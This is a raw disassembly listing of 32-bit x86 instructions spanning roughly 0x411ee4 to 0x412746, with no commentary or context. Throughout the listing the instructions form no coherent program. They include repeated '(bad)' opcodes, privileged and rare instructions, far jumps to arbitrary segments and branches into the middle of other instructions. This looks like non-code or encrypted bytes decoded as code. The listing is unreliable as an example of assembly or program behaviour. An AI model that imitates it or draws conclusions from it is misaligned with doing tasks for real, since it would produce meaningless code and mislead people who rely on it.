  411ee4:	cmp    al,BYTE PTR ds:0xe3fb78a4
  411eea:	repz lds eax,FWORD PTR [eax-0x6c25fd97]
  411ef1:	push   es
  411ef2:	ss xchg ebx,eax
  411ef4:	add    eax,0xd07ecbf6
  411ef9:	jg     0x411f24
  411efb:	fld    TBYTE PTR [ebp-0x44]
  411efe:	inc    ebp
  411eff:	mov    ecx,0x9b016917
  411f04:	push   eax
  411f05:	lods   eax,DWORD PTR ds:[esi]
  411f06:	xchg   DWORD PTR fs:[esi+esi*1-0x5c38dcb9],eax
  411f0e:	mov    eax,ds:0x56ed2d62
  411f13:	ret    
  411f14:	dec    ebp
  411f15:	lds    edi,FWORD PTR [esi+0x3b2b016f]
  411f1b:	dec    eax
  411f1c:	xor    al,0x72
  411f1e:	sub    eax,DWORD PTR ds:0xa10aa7fe
  411f24:	cli    
  411f25:	sub    DWORD PTR [edx],0x8c1071a6
  411f2b:	xchg   BYTE PTR [edx-0x31764183],dl
  411f31:	mov    ds:0x124b5bfb,al
  411f36:	cdq    
  411f37:	pop    edx
  411f38:	neg    eax
  411f3a:	pop    ss
  411f3b:	shl    edi,1
  411f3d:	xor    ah,BYTE PTR [ebx]
  411f3f:	sbb    BYTE PTR [esi],0xdb
  411f42:	aad    0x1b
  411f44:	(bad)  
  411f45:	loopne 0x411f46
  411f47:	sbb    eax,0x9b36b857
  411f4c:	pop    ebx
  411f4d:	push   edi
  411f4e:	gs jmp 0x411f0d
  411f51:	jmp    0x411ed3
  411f53:	push   edi
  411f54:	xor    ecx,edi
  411f56:	jnp    0x411f66
  411f58:	inc    ebp
  411f59:	push   ss
  411f5a:	sub    DWORD PTR [esi],eax
  411f5c:	test   BYTE PTR [ebp+0x75386d3d],ah
  411f62:	bound  esp,QWORD PTR [eax-0x23]
  411f65:	add    eax,0xe50837f4
  411f6a:	daa    
  411f6b:	lahf   
  411f6c:	arpl   WORD PTR [edi-0xe46e3a3],bp
  411f72:	add    esp,DWORD PTR [esi-0x7b]
  411f75:	loopne 0x411fca
  411f77:	in     al,0x14
  411f79:	add    DWORD PTR [eax-0x6a],0xffffffe5
  411f7d:	dec    ebx
  411f7e:	dec    sp
  411f80:	xor    al,0x19
  411f82:	adc    eax,0x95f3c6ff
  411f87:	push   ss
  411f88:	fmul   DWORD PTR [esi]
  411f8a:	ds pop ss
  411f8c:	sbb    al,0x17
  411f8e:	clc    
  411f8f:	jne    0x411f43
  411f91:	cwde   
  411f92:	hlt    
  411f93:	jmp    0xa3f18273
  411f98:	add    ebp,ebx
  411f9a:	and    BYTE PTR [edx],dh
  411f9c:	dec    ecx
  411f9d:	ret    
  411f9e:	in     al,dx
  411f9f:	inc    edi
  411fa0:	in     al,dx
  411fa1:	push   ds
  411fa2:	cwde   
  411fa3:	aas    
  411fa4:	fs repnz add al,0x29
  411fa8:	xchg   ebp,eax
  411fa9:	jo     0x412016
  411fab:	adc    BYTE PTR [eax],dl
  411fad:	arpl   WORD PTR [edx-0x5c0c571f],si
  411fb3:	retf   
  411fb4:	lods   eax,DWORD PTR ds:[esi]
  411fb5:	ror    bh,1
  411fb7:	dec    eax
  411fb8:	or     DWORD PTR [edi+esi*2-0xc887b98],0x3f402c3e
  411fc3:	aaa    
  411fc4:	data16 mov ah,ah
  411fc7:	pop    ebp
  411fc8:	adc    esp,edi
  411fca:	sub    al,0xe4
  411fcc:	mov    eax,0x6c98cf0c
  411fd1:	xchg   ebx,eax
  411fd2:	jno    0x412000
  411fd4:	int    0x94
  411fd6:	pop    ss
  411fd7:	test   DWORD PTR [ecx],edx
  411fd9:	or     ebx,eax
  411fdb:	mov    eax,0xad647a06
  411fe0:	ins    BYTE PTR es:[edi],dx
  411fe1:	(bad)  
  411fe2:	push   esp
  411fe3:	into   
  411fe4:	dec    edi
  411fe5:	sbb    edi,DWORD PTR [ebx-0x67]
  411fe8:	push   edx
  411fe9:	push   eax
  411fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411feb:	mov    BYTE PTR [ecx-0x25e688a7],al
  411ff1:	dec    edx
  411ff2:	dec    BYTE PTR [edi]
  411ff4:	or     eax,0x3f793c0d
  411ff9:	jb     0x411fda
  411ffb:	popa   
  411ffc:	pop    esp
  411ffd:	sbb    BYTE PTR [ecx],dl
  411fff:	xor    ebp,edi
  412001:	dec    edi
  412002:	aas    
  412003:	mov    ch,0xff
  412005:	loope  0x41207e
  412007:	imul   edi,DWORD PTR [ebx],0x2c3a4855
  41200d:	outs   dx,BYTE PTR ds:[esi]
  41200e:	test   eax,0x23b3b24e
  412013:	dec    esp
  412014:	push   ss
  412015:	bound  edi,QWORD PTR [esi+ebp*1]
  412018:	and    eax,DWORD PTR [eax+0x5b]
  41201b:	mov    ah,0x52
  41201d:	pop    ecx
  41201e:	jp     0x411faa
  412020:	push   ebp
  412021:	rcl    BYTE PTR [eax-0xf],cl
  412024:	xor    dl,BYTE PTR [edi-0x1ac66cfb]
  41202a:	into   
  41202b:	test   DWORD PTR [eax],eax
  41202d:	adc    edx,DWORD PTR [edi]
  41202f:	ins    BYTE PTR es:[edi],dx
  412030:	mov    edi,0xb091a26c
  412035:	outs   dx,DWORD PTR ds:[esi]
  412036:	xor    ah,cl
  412038:	push   ds
  412039:	xchg   ecx,eax
  41203a:	imul   esi,ecx,0xdeebfeeb
  412040:	jns    0x4120be
  412042:	fbld   TBYTE PTR [ecx+0x2cb42033]
  412048:	ins    DWORD PTR es:[edi],dx
  412049:	push   ecx
  41204a:	adc    DWORD PTR [edx+0x32],eax
  41204d:	push   ebp
  41204e:	add    BYTE PTR [ebx],al
  412050:	cmp    esp,DWORD PTR [ebx-0x5b]
  412053:	loop   0x4120ba
  412055:	leave  
  412056:	adc    eax,0x1dc07f59
  41205b:	in     eax,0xf4
  41205d:	dec    edi
  41205e:	out    0xef,eax
  412060:	aas    
  412061:	mov    esp,0xcad69c8f
  412066:	stos   BYTE PTR es:[edi],al
  412067:	hlt    
  412068:	sub    al,0x2a
  41206a:	adc    DWORD PTR [ebp+edi*2-0x2003459],esi
  412071:	arpl   WORD PTR [eax-0x1e],bp
  412074:	outs   dx,BYTE PTR ds:[esi]
  412075:	mov    DWORD PTR [ebx+0x6d102f9e],esi
  41207b:	jmp    0xcfc:0xabfbcc35
  412082:	inc    esp
  412083:	pop    ebx
  412084:	rcr    DWORD PTR [edi+0x7e978d0a],1
  41208a:	in     al,dx
  41208b:	scas   al,BYTE PTR es:[edi]
  41208c:	test   al,0x71
  41208e:	pushf  
  41208f:	mov    esp,0x1c8be3e6
  412095:	push   cs
  412096:	mov    eax,ds:0x62237ff6
  41209b:	mov    al,ds:0x2dc5c3f
  4120a0:	std    
  4120a1:	pop    esp
  4120a2:	in     al,0x48
  4120a4:	loopne 0x41207c
  4120a6:	xchg   DWORD PTR [eax+0x1e],esp
  4120a9:	imul   esp,ecx,0x493d6d89
  4120af:	mov    DWORD PTR [eax+eiz*1+0x50],edx
  4120b3:	retf   0x3a74
  4120b6:	addr16 call 0xa40f993c
  4120bc:	or     ah,BYTE PTR ds:[edx]
  4120bf:	loop   0x4120ae
  4120c1:	mov    ah,0xcc
  4120c3:	push   es
  4120c4:	rol    BYTE PTR [ebx-0x78],0x2e
  4120c8:	xor    dl,BYTE PTR [ecx]
  4120ca:	xor    ebx,ebp
  4120cc:	loopne 0x412134
  4120ce:	pop    esp
  4120cf:	gs push cs
  4120d1:	push   ebx
  4120d2:	adc    BYTE PTR ss:[edi-0x6],dh
  4120d6:	inc    esp
  4120d7:	mov    BYTE PTR [eax+0xce8ac63],cl
  4120dd:	test   al,0x8d
  4120df:	ret    0xa507
  4120e2:	jmp    0x23c1a631
  4120e7:	(bad)  
  4120e8:	xchg   ebx,eax
  4120e9:	rol    ebx,0x8f
  4120ec:	jmp    0x37a07b87
  4120f1:	outs   dx,DWORD PTR ds:[esi]
  4120f2:	sub    BYTE PTR [esi-0x40],0x3a
  4120f6:	mov    ebx,0xa23cb3b3
  4120fb:	out    dx,eax
  4120fc:	xchg   esp,eax
  4120fd:	es mov WORD PTR ds:[ebp+0x4],cs
  412102:	call   0x7518df90
  412107:	ins    BYTE PTR es:[edi],dx
  412108:	retf   
  412109:	dec    ecx
  41210a:	sbb    BYTE PTR [ecx],ch
  41210c:	sbb    bh,BYTE PTR [edx]
  41210e:	loopne 0x4120cb
  412110:	sbb    edi,edi
  412112:	mov    dl,0x3
  412114:	in     al,0x80
  412116:	cmp    eax,0x96b7a534
  41211b:	cmp    DWORD PTR [ebp+0x58],edi
  41211e:	fbstp  TBYTE PTR [esi+0x35b6e435]
  412124:	ret    
  412125:	enter  0xf76c,0xc7
  412129:	test   DWORD PTR [ebx+0x7e083293],0x24fa04aa
  412133:	stos   DWORD PTR es:[edi],eax
  412134:	jmp    0xe7db:0x211f8c46
  41213b:	test   DWORD PTR [edx+0x5b],eax
  41213e:	cmc    
  41213f:	xor    ch,BYTE PTR ds:0x307829a0
  412145:	push   edx
  412146:	push   esi
  412147:	sub    esi,DWORD PTR [esi]
  412149:	or     al,0x1d
  41214b:	xchg   ebx,eax
  41214c:	cs push edx
  41214e:	sub    eax,0xffffffb0
  412151:	add    eax,0xa885de08
  412156:	push   esi
  412157:	mov    dl,BYTE PTR [ebx-0x6b]
  41215a:	jge    0x41214c
  41215c:	inc    eax
  41215d:	lods   eax,DWORD PTR ds:[esi]
  41215e:	xchg   DWORD PTR [ebp+ecx*1-0xcd495fb],ebx
  412165:	repnz out 0x7a,eax
  412168:	fdivr  st(6),st
  41216a:	fcmovne st,st(5)
  41216c:	stos   BYTE PTR es:[edi],al
  41216d:	(bad)  
  41216f:	cmp    dh,0x5b
  412172:	in     al,dx
  412173:	mov    dl,0x53
  412175:	mov    ebp,0x91689558
  41217a:	popa   
  41217b:	or     DWORD PTR [ebp-0x1d95327f],ebp
  412181:	xchg   bh,cl
  412183:	stos   DWORD PTR es:[edi],eax
  412184:	les    ebp,FWORD PTR [eax-0x317fbf6a]
  41218a:	push   ebp
  41218b:	add    al,0x97
  41218d:	mov    ch,0x53
  41218f:	retf   0x35e5
  412192:	arpl   WORD PTR [ebx-0x3b],bx
  412195:	add    BYTE PTR [esp+ecx*8-0x40],ah
  412199:	(bad)  [ebp-0xa]
  41219c:	pop    ecx
  41219d:	push   esp
  41219e:	xchg   DWORD PTR [edi+ebx*2-0x11],ebx
  4121a2:	shl    BYTE PTR [ebp+0x4ae9dcb7],0xe0
  4121a9:	test   BYTE PTR ds:0x281ea978,bh
  4121af:	add    DWORD PTR [ecx],eax
  4121b1:	pop    ecx
  4121b2:	jne    0x41216c
  4121b4:	psubq  mm2,mm2
  4121b7:	call   0x148cae25
  4121bc:	leave  
  4121bd:	xor    eax,0x1eda0b33
  4121c2:	nop
  4121c3:	and    bl,cl
  4121c5:	outs   dx,DWORD PTR ds:[esi]
  4121c6:	ins    BYTE PTR es:[edi],dx
  4121c7:	mov    cl,al
  4121c9:	fisttp WORD PTR [eax]
  4121cb:	sbb    esp,DWORD PTR [edx-0x6d]
  4121ce:	int    0x80
  4121d0:	sub    BYTE PTR [esi+0x65],dh
  4121d3:	sbb    DWORD PTR [edx*8+0x3cbf922a],ebx
  4121da:	xchg   BYTE PTR [eax+eax*4-0x6],dh
  4121de:	test   DWORD PTR ds:0x4c178ba6,edi
  4121e4:	call   0x8b4d:0xded35562
  4121eb:	stc    
  4121ec:	or     DWORD PTR [edx-0xf],esi
  4121ef:	xchg   esi,eax
  4121f0:	imul   ebp,DWORD PTR [ebp+0x4],0xa2914398
  4121f7:	pop    esi
  4121f8:	xor    BYTE PTR [edi-0x2ec3f790],ah
  4121fe:	dec    ecx
  4121ff:	lahf   
  412200:	ins    BYTE PTR es:[edi],dx
  412201:	or     bl,BYTE PTR [eax]
  412203:	into   
  412204:	mov    BYTE PTR [ebx-0x3596c384],0x6
  41220b:	test   eax,0x9c70d4f4
  412210:	sub    ch,al
  412212:	mov    es:0x54554873,eax
  412218:	jne    0x4121a8
  41221a:	jae    0x4121d0
  41221c:	adc    al,0xda
  41221e:	sbb    al,0xe6
  412220:	inc    esp
  412221:	xchg   ebp,eax
  412222:	and    eax,0x2d8b13bb
  412227:	jb     0x4121d7
  412229:	mov    dl,0xeb
  41222b:	mov    bl,BYTE PTR ds:0x4b846ab
  412231:	lods   al,BYTE PTR ds:[esi]
  412232:	dec    ebp
  412233:	push   esi
  412234:	and    eax,0x445573a7
  412239:	cmp    DWORD PTR [ecx+0x7e69accd],0xffffffce
  412240:	aad    0xd9
  412242:	xchg   edi,eax
  412243:	mov    esp,0xfb4de5a5
  412248:	lahf   
  412249:	(bad)  [esp+esi*1+0x2]
  41224d:	cmp    eax,0x7cbe4052
  412252:	lahf   
  412253:	jbe    0x41228c
  412255:	retf   0x604e
  412258:	push   cs
  412259:	lea    esp,[ebx]
  41225b:	ins    BYTE PTR es:[edi],dx
  41225c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41225e:	push   ecx
  41225f:	and    DWORD PTR [edi+0x3417a69f],edx
  412265:	aad    0x8c
  412267:	sub    ah,BYTE PTR [ebx]
  412269:	xlat   BYTE PTR ds:[ebx]
  41226a:	pop    edi
  41226b:	test   al,0xb4
  41226d:	jnp    0x41225a
  41226f:	pop    esp
  412270:	or     BYTE PTR es:[ebp+0x6df21c5c],dl
  412277:	inc    ebx
  412278:	dec    edi
  412279:	lahf   
  41227a:	cmp    edi,DWORD PTR [ecx+0x5d]
  41227d:	leave  
  41227e:	out    0xd,eax
  412280:	push   ecx
  412281:	aaa    
  412282:	inc    DWORD PTR [edx+edx*1+0x34]
  412286:	dec    eax
  412287:	mov    al,ds:0xe63e488c
  41228c:	js     0x412303
  41228e:	out    dx,eax
  41228f:	cmp    al,0xe9
  412291:	pop    eax
  412292:	pop    ebx
  412293:	inc    edx
  412294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412295:	stos   BYTE PTR es:[edi],al
  412296:	jo     0x4122a8
  412298:	mov    ds:0x6420a00,eax
  41229d:	pop    esp
  41229e:	push   es
  41229f:	sbb    BYTE PTR [eax+0x668064db],bl
  4122a5:	ret    
  4122a6:	mov    edi,0xe5c8936
  4122ab:	mul    esi
  4122ad:	pop    ds
  4122ae:	or     eax,DWORD PTR [eax-0x3b15c40b]
  4122b4:	push   esp
  4122b5:	cmp    dh,BYTE PTR [edx-0x72]
  4122b8:	cmc    
  4122b9:	xor    al,0xd3
  4122bb:	lea    ecx,[edi+ecx*4-0x7d]
  4122bf:	mov    ds:0xd8f70328,eax
  4122c4:	retf   0x55ef
  4122c7:	mov    dl,0xb9
  4122c9:	sbb    dl,BYTE PTR [eax]
  4122cb:	mov    edx,0x2eb1627b
  4122d0:	lea    eax,[edx+0x4a]
  4122d3:	dec    ecx
  4122d4:	jbe    0x412258
  4122d6:	sbb    al,0x64
  4122d8:	(bad)  
  4122da:	enter  0x5434,0xbb
  4122de:	fldenv [eax-0x21d817cb]
  4122e4:	or     BYTE PTR [eax+0x5f],0x9e
  4122e8:	and    BYTE PTR [edx+eax*2+0x20],al
  4122ec:	enter  0x3da1,0xbc
  4122f0:	idiv   WORD PTR [ecx+0x1e]
  4122f4:	xor    bl,BYTE PTR ds:0x1b2c7ce7
  4122fa:	mov    bl,0xf7
  4122fc:	ds fmulp st(5),st
  4122ff:	sbb    eax,0x234cc962
  412304:	pusha  
  412305:	jmp    0x240a1cb6
  41230a:	dec    di
  41230c:	shr    esi,0x93
  41230f:	mov    ah,0xc1
  412311:	ds jmp 0x3ddc:0x60e154fc
  412319:	gs loope 0x41233c
  41231c:	lds    eax,FWORD PTR [esp+ebx*1]
  41231f:	(bad)  
  412320:	aad    0x8d
  412322:	add    esp,ebp
  412324:	jbe    0x41238b
  412326:	out    0x17,eax
  412328:	sub    DWORD PTR [ebx],esp
  41232a:	dec    edi
  41232b:	fmul   QWORD PTR [esi+0x38085802]
  412331:	pop    es
  412332:	inc    esi
  412333:	sub    eax,0x3fb18246
  412338:	jmp    0x3f15:0x1bcf0db4
  41233f:	sub    DWORD PTR ds:0xe343a33f,esi
  412345:	hlt    
  412346:	imul   ebp,DWORD PTR [esi],0xe6139a57
  41234c:	cld    
  41234d:	pop    ecx
  41234e:	outs   dx,DWORD PTR ds:[esi]
  41234f:	ret    0xe802
  412352:	adc    bl,bh
  412354:	xchg   BYTE PTR [ecx],dh
  412356:	imul   esp,DWORD PTR [esi-0x51bc66b9],0x10
  41235d:	mov    dh,0x8e
  41235f:	inc    ebx
  412360:	xor    BYTE PTR [ebx],bh
  412362:	xchg   DWORD PTR [edi+0x4e553613],edx
  412368:	cdq    
  412369:	pop    eax
  41236a:	(bad)  
  41236b:	ficom  WORD PTR [ebx]
  41236d:	dec    eax
  41236e:	mov    eax,ds:0x1feafcf1
  412373:	mov    edx,0xd803f93c
  412378:	in     al,dx
  412379:	scas   eax,DWORD PTR es:[edi]
  41237a:	cmp    al,al
  41237c:	jmp    0xe85fa28c
  412381:	daa    
  412382:	shr    DWORD PTR [esi+0x22],cl
  412385:	jae    0x412366
  412387:	pusha  
  412388:	pusha  
  412389:	inc    ebx
  41238a:	adc    esp,DWORD PTR [edx]
  41238c:	ins    DWORD PTR es:[edi],dx
  41238d:	jae    0x4123b8
  41238f:	adc    DWORD PTR [esi+0x6c9ef7ed],esi
  412395:	pop    eax
  412396:	mov    DWORD PTR [ebx+eax*2],ebp
  412399:	pop    esi
  41239a:	add    eax,0x9d277b6c
  41239f:	mov    esp,0x6d08aa4d
  4123a4:	mov    cl,0x20
  4123a6:	xchg   edx,eax
  4123a7:	sbb    BYTE PTR [eax],0x33
  4123aa:	addr16 jge 0x412397
  4123ad:	out    dx,al
  4123ae:	dec    edi
  4123af:	jecxz  0x4123c5
  4123b1:	dec    esp
  4123b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123b4:	or     esi,DWORD PTR [eax+eiz*2+0x69]
  4123b8:	loope  0x412366
  4123ba:	push   ds
  4123bb:	sub    dh,0x60
  4123be:	xor    esp,DWORD PTR [esi]
  4123c0:	ret    
  4123c1:	ins    DWORD PTR es:[edi],dx
  4123c2:	jle    0x4123b0
  4123c4:	(bad)  [edx+0x7f6b629c]
  4123ca:	cmp    ah,0xf9
  4123cd:	fcmovne st,st(1)
  4123cf:	mov    edx,0x94683761
  4123d4:	cli    
  4123d5:	jmp    0x436d6999
  4123da:	push   edi
  4123db:	pop    ecx
  4123dc:	daa    
  4123dd:	and    eax,0x6f048bac
  4123e2:	stos   BYTE PTR es:[edi],al
  4123e3:	jmp    0x41239c
  4123e5:	mov    ecx,0xeb5aa08b
  4123ea:	stc    
  4123eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ec:	div    DWORD PTR [ebx]
  4123ee:	inc    esp
  4123ef:	and    DWORD PTR [eax+0xbcc6799],eax
  4123f5:	mov    eax,esi
  4123f7:	das    
  4123f8:	pop    ebp
  4123f9:	add    BYTE PTR es:[ecx-0x12],al
  4123fd:	cmc    
  4123fe:	xchg   esp,eax
  4123ff:	push   esp
  412400:	add    dl,BYTE PTR [esi]
  412402:	leave  
  412403:	pop    bp
  412405:	xchg   edx,eax
  412406:	cli    
  412407:	jns    0x4123ae
  412409:	mov    ebp,0xc3a70b5d
  41240e:	ins    BYTE PTR es:[edi],dx
  41240f:	mov    edi,0x99fac7be
  412414:	cs mov dl,0xee
  412417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412418:	mov    dh,0x13
  41241a:	jle    0x412411
  41241c:	push   esp
  41241d:	adc    eax,0xffffff9d
  412420:	adc    eax,edx
  412422:	repz mov ecx,0xc5c00258
  412428:	clc    
  412429:	imul   eax,DWORD PTR [eax-0x4419dff6],0x6543a1ed
  412433:	push   esi
  412434:	rsm    
  412436:	mov    edi,0x35aca41d
  41243b:	fistp  QWORD PTR [ebx+edx*4+0x2480a275]
  412442:	das    
  412443:	and    ch,ah
  412445:	jae    0x412497
  412447:	xor    ebx,ebp
  412449:	mov    ds:0xff9b44aa,eax
  41244e:	sar    BYTE PTR [esi],1
  412450:	inc    ecx
  412451:	dec    dh
  412453:	sar    BYTE PTR [eax+0x26606024],cl
  412459:	cmc    
  41245a:	scas   al,BYTE PTR es:[edi]
  41245b:	xor    BYTE PTR [esi+esi*8-0x4cee72c7],0x83
  412463:	mov    al,0x1c
  412465:	adc    dl,bl
  412467:	sub    al,bh
  412469:	adc    al,0x6f
  41246b:	xchg   ecx,eax
  41246c:	div    BYTE PTR [eax+0x2c7e8025]
  412472:	jle    0x4124d9
  412474:	mov    BYTE PTR [ebp+0x1a55e0ca],ch
  41247a:	xchg   ecx,eax
  41247b:	outs   dx,BYTE PTR ds:[esi]
  41247c:	jo     0x412431
  41247e:	scas   al,BYTE PTR es:[edi]
  41247f:	mov    ah,cl
  412481:	jns    0x4124fc
  412483:	mov    bh,0x9f
  412485:	out    0x3,al
  412487:	loopne 0x4124e3
  412489:	retf   
  41248a:	add    al,0x8f
  41248c:	and    BYTE PTR [ebx+0xa0723f2],dh
  412492:	popf   
  412493:	outs   dx,BYTE PTR ds:[esi]
  412494:	icebp  
  412495:	out    0x34,al
  412497:	int    0x0
	...
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	mov    dl,0xeb
  412517:	sub    bl,0xd9
  41251a:	jnp    0x4124d6
  41251c:	imul   ecx,DWORD PTR [edx],0x6
  41251f:	and    DWORD PTR [edx+0x2d],edx
  412522:	out    0xe7,al
  412524:	adc    eax,0x6c0000ce
  412529:	pop    es
  41252a:	add    BYTE PTR [eax],al
  41252c:	push   eax
  41252d:	fwait
  41252e:	adc    al,0x7b
  412530:	and    ah,BYTE PTR [ebx]
  412532:	inc    esp
  412533:	dec    ebx
  412534:	lea    ecx,[edi]
  412536:	ret    
  412537:	(bad)  
  412539:	push   edi
  41253a:	in     al,0xa0
  41253c:	imul   edi,DWORD PTR [ebx+0x5cc99726],0xaacbe38d
  412546:	mov    al,ds:0xad1b0618
  41254b:	sbb    eax,0xda9a20b3
  412550:	add    al,0xb4
  412552:	popa   
  412553:	pop    ss
  412554:	data16 loope 0x412537
  412557:	sbb    DWORD PTR [ecx+0x4f9dd80],eax
  41255d:	ret    
  41255e:	add    al,0xfe
  412560:	cdq    
  412561:	mov    ebp,0x322a7d54
  412566:	xor    DWORD PTR [eax+0x27],edx
  412569:	scas   eax,DWORD PTR es:[edi]
  41256a:	ret    
  41256b:	cli    
  41256c:	inc    esi
  41256d:	je     0x41253f
  41256f:	dec    edx
  412570:	inc    edx
  412571:	jnp    0x4125ab
  412573:	sar    DWORD PTR [ecx-0x706bbab9],1
  412579:	sub    al,0x3a
  41257b:	test   DWORD PTR [esi],esp
  41257d:	mov    dh,0x59
  41257f:	push   esp
  412580:	adc    DWORD PTR [eax],ecx
  412582:	pop    ebx
  412583:	push   edi
  412584:	xchg   ebp,eax
  412585:	sub    dh,BYTE PTR [esi-0x79]
  412588:	xor    cl,dh
  41258a:	add    dh,BYTE PTR [esi+0x7b]
  41258d:	jmp    0x80ce9896
  412592:	add    al,0x7c
  412594:	cmp    DWORD PTR [edx],esi
  412596:	adc    eax,0x5d98a56f
  41259b:	xor    esp,edx
  41259d:	lods   eax,DWORD PTR ds:[esi]
  41259e:	add    ebp,eax
  4125a0:	(bad)  
  4125a1:	adc    ebp,ecx
  4125a3:	cmp    ebx,eax
  4125a5:	pop    es
  4125a6:	into   
  4125a7:	test   al,0x71
  4125a9:	(bad)  
  4125aa:	in     al,0xc9
  4125ac:	fwait
  4125ad:	sub    ch,dl
  4125af:	sar    BYTE PTR [ecx+0xcd0debd],cl
  4125b5:	adc    edi,esi
  4125b7:	cwde   
  4125b8:	mov    bh,0x11
  4125ba:	popa   
  4125bb:	xor    bl,BYTE PTR [ebx-0x7e3df2e]
  4125c1:	push   ds
  4125c2:	sbb    esp,edx
  4125c4:	and    edx,DWORD PTR [eax+ebp*4]
  4125c7:	jb     0x412643
  4125c9:	dec    esi
  4125ca:	fs xchg ecx,eax
  4125cc:	sbb    dl,ch
  4125ce:	add    DWORD PTR [edi],ebp
  4125d0:	jmp    0xf4e7:0xae953983
  4125d7:	jmp    0xe2807628
  4125dc:	cmp    BYTE PTR [ecx+0x49bf63d7],ah
  4125e2:	in     eax,dx
  4125e3:	clc    
  4125e4:	outs   dx,BYTE PTR ds:[esi]
  4125e5:	mov    cl,0x90
  4125e7:	shl    ecx,1
  4125e9:	je     0x41259f
  4125eb:	push   0x7d
  4125ed:	int3   
  4125ee:	or     DWORD PTR [edi],edx
  4125f0:	mov    eax,0xe02f821f
  4125f5:	sbb    esp,DWORD PTR [eax+0x69845c1b]
  4125fb:	(bad)  
  4125fc:	adc    al,0xb7
  4125fe:	rcr    BYTE PTR [edx-0x21],cl
  412601:	out    dx,eax
  412602:	inc    esp
  412603:	xchg   esp,eax
  412604:	mov    dh,0xdc
  412606:	or     DWORD PTR [edx-0x57],ecx
  412609:	or     BYTE PTR [edi+ebx*8],dl
  41260c:	add    esp,DWORD PTR [ecx+0x7b968e80]
  412612:	and    eax,0xe0446785
  412617:	(bad)  [ebx]
  41261a:	and    DWORD PTR [ecx+0x18b7b06b],ecx
  412620:	ret    
  412621:	sub    al,0x57
  412623:	lahf   
  412624:	or     eax,0x31d6a943
  412629:	mov    al,ds:0xbea782c8
  41262e:	xchg   esp,eax
  41262f:	mov    ds,edi
  412631:	mov    eax,ds:0xd1a83642
  412636:	sti    
  412637:	inc    ecx
  412638:	pop    esi
  412639:	das    
  41263a:	mov    ebp,0x5a4e7d82
  41263f:	scas   eax,DWORD PTR es:[edi]
  412640:	cwde   
  412641:	dec    eax
  412642:	pop    eax
  412643:	outs   dx,DWORD PTR ds:[esi]
  412644:	adc    al,BYTE PTR [edx]
  412646:	pop    es
  412647:	test   al,0x3d
  412649:	addr16 or ch,al
  41264c:	and    DWORD PTR [esi-0xe],edi
  41264f:	lods   eax,DWORD PTR ds:[esi]
  412650:	ret    
  412651:	lea    ebp,[esi-0x37]
  412654:	adc    cl,BYTE PTR [edi]
  412656:	push   ebx
  412657:	cmc    
  412658:	cmp    edx,DWORD PTR [ecx+0x64]
  41265b:	or     eax,0x477397ea
  412660:	data16 repnz or al,dl
  412664:	mov    eax,ds:0x9487167d
  412669:	pop    ebx
  41266a:	cld    
  41266b:	sub    BYTE PTR [edi+esi*8],dl
  41266e:	lahf   
  41266f:	xor    al,0x29
  412671:	inc    ebx
  412672:	inc    eax
  412674:	jg     0x412632
  412676:	sbb    al,0x40
  412678:	icebp  
  412679:	aas    
  41267a:	push   ss
  41267b:	(bad)  
  41267c:	js     0x41260a
  41267e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267f:	int    0x9d
  412681:	xchg   BYTE PTR [ecx],al
  412683:	mov    ebx,0x9cbb598c
  412688:	sbb    esi,DWORD PTR [esi]
  41268a:	daa    
  41268b:	or     eax,0x97abecac
  412690:	xlat   BYTE PTR ds:[ebx]
  412691:	(bad)  
  412692:	popf   
  412693:	push   0x222c9187
  412698:	pop    edx
  412699:	and    BYTE PTR [ecx],cl
  41269b:	mov    esp,ebx
  41269d:	rol    dh,1
  41269f:	into   
  4126a0:	dec    esi
  4126a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126a2:	fsubr  QWORD PTR [edx]
  4126a4:	fiadd  DWORD PTR [edx-0x62f11525]
  4126aa:	daa    
  4126ab:	adc    ah,dl
  4126ad:	sbb    esi,DWORD PTR [edx-0x7a3cad3a]
  4126b3:	sbb    al,0x9c
  4126b5:	div    BYTE PTR [esi+0x76a42a60]
  4126bb:	jge    0x4126bd
  4126bd:	rol    DWORD PTR [ebx+0x16],0x9
  4126c1:	pop    es
  4126c2:	ins    BYTE PTR es:[edi],dx
  4126c3:	shl    BYTE PTR [ecx-0x7e],cl
  4126c6:	adc    dl,BYTE PTR [esi+edx*8-0x541f5f0f]
  4126cd:	mov    ch,BYTE PTR [eax-0xace28aa]
  4126d3:	and    al,0x27
  4126d5:	add    al,0x35
  4126d7:	add    eax,0xfbd6072c
  4126dc:	loope  0x4126b7
  4126de:	xor    ebx,ebp
  4126e0:	pop    esp
  4126e1:	pop    ds
  4126e2:	in     al,dx
  4126e3:	jb     0x4126f2
  4126e5:	repnz sbb eax,0x55345574
  4126eb:	iret   
  4126ec:	popa   
  4126ed:	mov    esp,DWORD PTR [ebx]
  4126ef:	xchg   ebx,eax
  4126f0:	std    
  4126f1:	and    BYTE PTR [eax],bh
  4126f3:	jb     0x41276e
  4126f5:	bound  ecx,QWORD PTR [edx+0x4e]
  4126f8:	(bad)  
  4126f9:	xchg   edx,eax
  4126fa:	hlt    
  4126fb:	inc    ebx
  4126fc:	fwait
  4126fd:	add    eax,0x9344deac
  412702:	(bad)  
  412703:	inc    edi
  412704:	mov    es,eax
  412706:	sbb    eax,0xb8f5b334
  41270b:	jge    0x412767
  41270d:	push   0x29
  41270f:	jmp    0x2922:0x602a1b46
  412716:	mov    eax,0x41df125a
  41271b:	imul   edx,DWORD PTR [esi],0xd0b19d9c
  412721:	sar    BYTE PTR [edi+0x2343d4cd],0x1f
  412728:	icebp  
  412729:	repnz lods al,BYTE PTR ds:[esi]
  41272b:	je     0x412745
  41272d:	inc    edi
  41272e:	das    
  41272f:	(bad)  
  412730:	and    edx,esi
  412732:	xchg   cl,dh
  412734:	cs xchg ecx,eax
  412736:	adc    BYTE PTR [ebp+0x1bd7596f],bl
  41273c:	ins    DWORD PTR es:[edi],dx
  41273d:	out    dx,al
  41273e:	or     eax,0x8af12077
  412743:	(bad)  
  412744:	adc    al,ah
  412746:	into   
